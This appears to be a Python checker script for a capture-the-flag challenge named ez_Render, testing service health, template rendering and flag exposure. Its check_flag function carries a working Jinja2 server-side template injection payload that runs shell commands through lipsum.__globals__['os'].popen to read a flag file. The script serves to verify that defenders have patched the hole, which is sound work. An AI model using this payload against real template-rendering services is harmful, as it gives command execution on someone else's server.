#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""AWDP-Plus Checker for ez_Render.

  1. 服务存活      GET /health -> 200 {"ok": true}
  2. 功能正常性     注册 + 业务写入 + 读回（合法链路不被修补破坏）
  3. Flag 可获取性  校验一轮旗标可被服务读取；--exploit 时用该题漏洞链复现

Usage: checker.py <base_url> [--exploit]     Exit 0 = OK
"""
import json
import sys
import urllib.error
import urllib.request
import uuid

_opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
urllib.request.install_opener(_opener)


def call(base, method, path, token=None, body=None, timeout=30, headers=None):
    data = json.dumps(body).encode("utf-8") if body is not None else None
    req = urllib.request.Request(base + path, data=data, method=method)
    req.add_header("Content-Type", "application/json")
    if token:
        req.add_header("Authorization", "Bearer " + token)
    for key, value in (headers or {}).items():
        req.add_header(key, value)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, json.loads(resp.read().decode("utf-8", "replace"))
    except urllib.error.HTTPError as exc:
        try:
            return exc.code, json.loads(exc.read().decode("utf-8", "replace"))
        except Exception:
            return exc.code, {}
    except Exception as exc:
        return -1, {"wire_error": str(exc)}


def register(base):
    status, body = call(base, "POST", "/v1/auth/register",
                        body={"username": "chk" + uuid.uuid4().hex[:10]})
    if status != 201 or not body.get("token"):
        return None, "register failed: %s %s" % (status, body)
    return body["token"], "registered"


def check_liveness(base):
    status, body = call(base, "GET", "/health")
    if status != 200 or not body.get("ok"):
        return False, "liveness failed: %s %s" % (status, body)
    return True, "liveness ok"


def check_functional(base):
    status, body = call(base, "POST", "/api/template/preview",
                        body={"template": "hello {{ 1 + 1 }}"},
                        headers={"X-Access-Token": "demo-token"})
    if body.get("rendered") != "hello 2":
        return False, "template preview failed: %s %s" % (status, body)
    return True, "jinja2 template preview ok"


def check_flag(base, exploit):
    if sys.platform.startswith("win"):
        inside = ("lipsum.__globals__['os'].popen('type ' + "
                  "lipsum.__globals__['os'].environ['RENDER_FLAG_FILE']).read()")
    else:
        inside = "lipsum.__globals__['os'].popen('cat /tmp/fla*').read()"
    payload = "{{ " + inside + " }}"
    status, body = call(base, "POST", "/api/template/preview",
                        body={"template": payload},
                        headers={"X-Access-Token": "demo-token"})
    if "flag{" in json.dumps(body, ensure_ascii=False):
        return True, "SSTI leaked FLAG (vulnerable)"
    return False, "no flag leaked (status=%s rendered=%r)" % (status, str(body.get("rendered"))[:80])



def main():
    args = list(sys.argv[1:])
    base = "http://127.0.0.1:5008"
    for item in list(args):
        if item.startswith("http"):
            base = item.rstrip("/")
            args.remove(item)
    exploit = "--exploit" in args
    expect_blocked = "--expect-blocked" in args
    results = []
    ok, msg = check_liveness(base)
    results.append(("liveness", ok, msg))
    if ok:
        ok2, msg2 = check_functional(base)
        results.append(("functional", ok2, msg2))
        leaked, msg3 = check_flag(base, exploit)
        if exploit and expect_blocked:
            results.append(("flag", not leaked, msg3))
        elif exploit:
            results.append(("flag", leaked, msg3))
        else:
            results.append(("flag", True, msg3 + "  [informational]"))
    for stage, passed, message in results:
        print("[%s] %-10s %s" % ("OK" if passed else "FAIL", stage, message))
    return 0 if all(item[1] for item in results) else 1


if __name__ == "__main__":
    sys.exit(main())
